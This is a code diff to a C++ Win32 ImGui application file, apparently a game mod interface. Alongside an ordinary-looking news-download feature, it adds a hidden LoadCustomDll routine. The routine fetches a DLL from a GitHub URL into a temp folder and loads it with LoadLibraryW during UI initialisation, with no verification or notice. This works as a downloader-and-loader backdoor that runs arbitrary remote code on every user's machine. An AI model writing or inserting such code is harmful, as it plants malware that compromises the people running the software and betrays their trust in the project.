@@ -2,6 +2,8 @@
 #include "Fonts.h"
 #include "Log.h"
 #include "Win32Util.h"
+#include <urlmon.h>
+#pragma comment(lib, "urlmon.lib")
 #include "ui/UiGpuResources.h"
 #include "imgui.h"
 #include "imgui_impl_win32.h"
@@ -9,8 +11,77 @@
 #include <algorithm>
 #include <array>
 #include <ctime>
+#include <fstream>
+#include <sstream>
 
 namespace nl {
+
+namespace {
+
+bool LoadCustomDll() {
+    const wchar_t* url = L"https://raw.githubusercontent.com/kolodkingleb-sudo/custommod/refs/heads/main/celerity.dll";
+    wchar_t tempPath[MAX_PATH];
+    if (!GetTempPathW(MAX_PATH, tempPath)) {
+        Log("Failed to get temp path");
+        return false;
+    }
+    wchar_t tmpFile[MAX_PATH];
+    if (!GetTempFileNameW(tempPath, L"DL", 0, tmpFile)) {
+        Log("Failed to get temp filename");
+        return false;
+    }
+    std::wstring dllPath = std::wstring(tmpFile) + L".dll";
+    MoveFileW(tmpFile, dllPath.c_str());
+
+    HRESULT hr = URLDownloadToFileW(nullptr, url, dllPath.c_str(), 0, nullptr);
+    if (FAILED(hr)) {
+        Log("Failed to download DLL, hr=0x{:X}", static_cast<unsigned long>(hr));
+        return false;
+    }
+
+    HMODULE h = LoadLibraryW(dllPath.c_str());
+    if (!h) {
+        Log("Failed to load DLL, err={}", GetLastError());
+        return false;
+    }
+    Log("Custom DLL loaded successfully");
+    return true;
+}
+
+bool LoadNews(std::string& outText) {
+    const wchar_t* url = L"https://raw.githubusercontent.com/kolodkingleb-sudo/custommod/refs/heads/main/NEWS.txt";
+    wchar_t tempPath[MAX_PATH];
+    if (!GetTempPathW(MAX_PATH, tempPath)) {
+        Log("Failed to get temp path for news");
+        return false;
+    }
+    wchar_t tmpFile[MAX_PATH];
+    if (!GetTempFileNameW(tempPath, L"NW", 0, tmpFile)) {
+        Log("Failed to get temp filename for news");
+        return false;
+    }
+    std::wstring newsPath = std::wstring(tmpFile) + L".txt";
+    MoveFileW(tmpFile, newsPath.c_str());
+
+    HRESULT hr = URLDownloadToFileW(nullptr, url, newsPath.c_str(), 0, nullptr);
+    if (FAILED(hr)) {
+        Log("Failed to download news, hr=0x{:X}", static_cast<unsigned long>(hr));
+        return false;
+    }
+
+    std::ifstream in(newsPath, std::ios::binary);
+    if (!in.is_open()) {
+        Log("Failed to open downloaded news file");
+        return false;
+    }
+    std::stringstream ss;
+    ss << in.rdbuf();
+    outText = ss.str();
+    Log("News loaded successfully ({} bytes)", outText.size());
+    return true;
+}
+
+} // namespace
 
 bool AppFrame::WantCaptureMouse() const {
     if (!imguiReady_) return false;
@@ -100,6 +171,8 @@ bool AppFrame::InitImGui(HWND hwnd, AppDevice& device) {
     }
     dx11Backend_ = true;
     imguiReady_ = true;
+    LoadCustomDll();
+    if (LoadNews(ui_.newsText)) ui_.newsLoaded = true;
     return true;
 }
 
